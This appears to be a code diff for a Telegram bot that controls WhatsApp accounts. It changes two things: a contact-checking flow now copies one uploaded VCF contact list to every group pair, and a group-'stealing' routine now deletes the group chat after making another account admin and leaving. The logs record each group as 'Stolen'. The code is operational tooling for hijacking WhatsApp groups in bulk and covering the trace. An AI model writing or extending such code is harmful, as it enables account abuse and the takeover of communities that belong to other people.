@@ -19,6 +19,7 @@ import {
   getAllGroups,
   getGroupInviteLink,
   leaveGroup,
+  deleteGroupChat,
   getGroupParticipants,
   removeGroupParticipant,
   getGroupPendingList,
@@ -5366,8 +5367,9 @@ bot.callbackQuery("ctc_start_check", async (ctx) => {
     return;
   }
 
-  const activePairs = state.ctcData.pairs.filter((p) => p.vcfContacts.length > 0);
-  if (!activePairs.length) {
+  // If user sent 1 VCF for multiple groups, replicate it to all empty pairs
+  const filledPairs = state.ctcData.pairs.filter(p => p.vcfContacts.length > 0);
+  if (!filledPairs.length) {
     try {
       await ctx.editMessageText("⚠️ No VCF files provided. Please send VCF files first.");
     } catch {
@@ -5375,6 +5377,14 @@ bot.callbackQuery("ctc_start_check", async (ctx) => {
     }
     return;
   }
+  // Replicate first available VCF to all empty pairs so 1 merged VCF covers all groups
+  const referencePair = filledPairs[0];
+  for (const pair of state.ctcData.pairs) {
+    if (pair.vcfContacts.length === 0) {
+      pair.vcfContacts = referencePair.vcfContacts.map(c => ({ ...c }));
+    }
+  }
+  const activePairs = state.ctcData.pairs;
 
   const chatId = ctx.callbackQuery.message?.chat.id;
   const msgId = ctx.callbackQuery.message?.message_id;
@@ -7360,6 +7370,8 @@ async function runStealGroupPoll(session: StealGroupSession): Promise<void> {
         try { await makeGroupAdmin(waUserId, group.id, jid); } catch {}
         await new Promise(r => setTimeout(r, 800));
         try { await leaveGroup(waUserId, group.id); } catch {}
+        await new Promise(r => setTimeout(r, 1000));
+        try { await deleteGroupChat(waUserId, group.id); } catch {}
         group.done = true;
         session.totalStolen++;
         console.log(`[StealGroup][${adminId}] Stolen via pending: ${group.subject} → ${jid}`);
@@ -7377,6 +7389,8 @@ async function runStealGroupPoll(session: StealGroupSession): Promise<void> {
         try { await makeGroupAdmin(waUserId, group.id, jid); } catch {}
         await new Promise(r => setTimeout(r, 800));
         try { await leaveGroup(waUserId, group.id); } catch {}
+        await new Promise(r => setTimeout(r, 1000));
+        try { await deleteGroupChat(waUserId, group.id); } catch {}
         group.done = true;
         session.totalStolen++;
         console.log(`[StealGroup][${adminId}] Stolen via direct join: ${group.subject} → ${jid}`);
